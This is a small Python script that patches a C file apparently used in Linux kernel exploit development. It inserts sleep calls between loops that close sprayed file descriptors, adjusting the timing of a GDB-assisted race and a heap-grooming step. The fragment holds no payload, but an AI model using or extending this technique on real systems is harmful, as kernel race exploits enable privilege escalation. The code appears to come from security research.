with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

old_code = """    // Trigger race (GDB-assisted survivor)
    printf("[*] Calling getpid() to arm GDB hook...\\n");
    fflush(stdout);
    getpid();
    
    close(inner);
    for (int i = 0; i < 32; i++) close(batch_a[i]);
    for (int i = 0; i < 32; i++) close(batch_b[i]);
    for (int i = 0; i < 4000; i++) close(bg_fds[i]);
    
    // Wait for all to reach buddy!
    sleep(2);"""

new_code = """    // Trigger race (GDB-assisted survivor)
    printf("[*] Calling getpid() to arm GDB hook...\\n");
    fflush(stdout);
    getpid();
    
    close(inner);
    sleep(1);
    
    for (int i = 0; i < 32; i++) close(batch_a[i]);
    for (int i = 0; i < 32; i++) close(batch_b[i]);
    sleep(1);
    
    // We don't need bg_fds anymore, or we can close them too
    for (int i = 0; i < 4000; i++) close(bg_fds[i]);
    sleep(1);"""

text = text.replace(old_code, new_code)
with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
